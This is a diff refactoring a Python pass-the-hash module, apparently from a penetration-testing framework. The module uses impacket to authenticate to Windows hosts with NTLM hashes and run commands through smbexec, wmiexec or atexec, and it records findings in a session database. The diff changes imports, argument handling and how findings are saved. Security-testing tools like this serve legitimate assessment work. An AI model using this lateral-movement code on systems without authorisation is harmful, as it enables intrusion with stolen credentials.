@@ -10,10 +10,16 @@ Uso:
 Requiere: impacket
 """
 
-from impacket.smbconnection import SMBConnection
-from impacket.dcerpc.v5 import transport, scmr
-from impacket.dcerpc.v5.dcom import wmi
-from impacket.dcerpc.v5.dcomrt import DCOMConnection
+from scripts.base import BaseScript
+
+try:
+    from impacket.smbconnection import SMBConnection
+    from impacket.dcerpc.v5 import transport, scmr
+    from impacket.dcerpc.v5.dcom import wmi
+    from impacket.dcerpc.v5.dcomrt import DCOMConnection
+    _OK = True
+except ImportError:
+    _OK = False
 
 from core.output import console, print_result
 from core import session_db
@@ -27,22 +33,23 @@ def _split_hash(h: str):
     return 'aad3b435b51404eeaad3b435b51404ee', h
 
 
-class Script:
-    NAME        = "pass-the-hash"
-    DESCRIPTION = "Lateral movement con hash NTLM (PtH) vía SMB/WMIEXEC"
+class Script(BaseScript):
+    name        = "pass-the-hash"
+    protocol    = "smb"
+    category    = "attack"
+    description = "Lateral movement con hash NTLM (PtH) vía SMB/WMIEXEC"
 
-    def __init__(self, target, creds):
-        self.target = target
-        self.creds  = creds
-
-    def run(self, args):
+    def run(self, **kwargs):
+        if not _OK:
+            console.print("[red]impacket no está instalado.[/red]")
+            return
         target  = str(self.target.ip)
-        user    = getattr(args, 'username', None) or (self.creds.username if self.creds else None)
-        domain  = getattr(args, 'domain',   '') or (self.creds.domain   if self.creds else '')
-        hash_   = getattr(args, 'hash',     None) or (self.creds.hash   if self.creds else None)
-        cmd     = getattr(args, 'exec',     None)
-        shell   = getattr(args, 'shell',    False)
-        method  = getattr(args, 'method',   'smbexec')  # smbexec | wmiexec | atexec
+        user    = self.creds.user or kwargs.get('user')
+        domain  = self.creds.domain or kwargs.get('domain', '')
+        hash_   = self.creds.hash or kwargs.get('hash')
+        cmd     = kwargs.get('exec')
+        shell   = kwargs.get('shell', False)
+        method  = kwargs.get('method', 'smbexec')  # smbexec | wmiexec | atexec
 
         if not user or not hash_:
             console.print("[red]Falta -u USER y -H HASH (formato LM:NT o :NT)[/red]")
@@ -62,9 +69,9 @@ class Script:
             console.print(f"  [red]✗ Autenticación fallida: {e}[/red]")
             return
 
-        session_db.save_finding(
-            category="pass_the_hash",
-            data={"target": target, "user": user, "domain": domain, "nt_hash": nt_hash, "method": method}
+        session_db.DB.SaveFinding(
+            target, "SMB", "pass_the_hash",
+            f"user={domain}\\{user} method={method}"
         )
 
         if not cmd and not shell:
